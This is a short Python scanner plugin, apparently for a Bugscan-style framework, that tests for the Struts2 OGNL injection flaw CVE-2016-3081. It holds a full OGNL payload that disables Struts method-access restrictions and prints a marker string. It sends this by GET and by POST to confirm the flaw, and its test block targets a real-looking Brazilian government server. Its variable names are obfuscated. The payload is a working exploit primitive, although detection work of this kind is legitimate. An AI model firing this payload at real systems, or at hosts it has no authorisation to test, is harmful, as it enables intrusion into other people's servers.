#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 01001000entai
#_PlugName_ = struts2 CVE-2016-3081
#__Refer___ = http://www.wooyun.org/content/26856

import re
import random
import time

def assign(service, arg):
    if service == 'struts':
        return True, arg

def audit(arg):
    ii11i = "('#_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('#context[\'xwork.MethodAccessor.denyMethodExecution\']=false')(b))&('#c')(('#_memberAccess.excludeProperties=@java.util.Collections@EMPTY_SET')(c))&(g)(('#req=@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('#xman=@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('#xman=@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('#xman.getWriter().println(%22@websafescan@%22)')(d))&(i99)(('#xman.getWriter().close()')(d))=1"
    oOooOoO0Oo0O = '''@websafescan@'''
    iI1, i1I11i, OoOoOO00, I11i, O0O = curl.curl2('''%s?stamp=%s&%s''' % (arg, str(time.time()), ii11i))
    if OoOoOO00 and OoOoOO00.find(oOooOoO0Oo0O) != -1:
        security_hole(arg)
    else:
        iI1, i1I11i, OoOoOO00, I11i, O0O = curl.curl2(arg, '''stamp=%s&%s''' % (str(time.time()), ii11i))
        if OoOoOO00 and OoOoOO00.find(oOooOoO0Oo0O) != -1:
            security_hole(arg)


if __name__ == "__main__":
    from dummy import *
    audit(assign("struts", "https://homolog.govdigital.com.br/index.action")[1])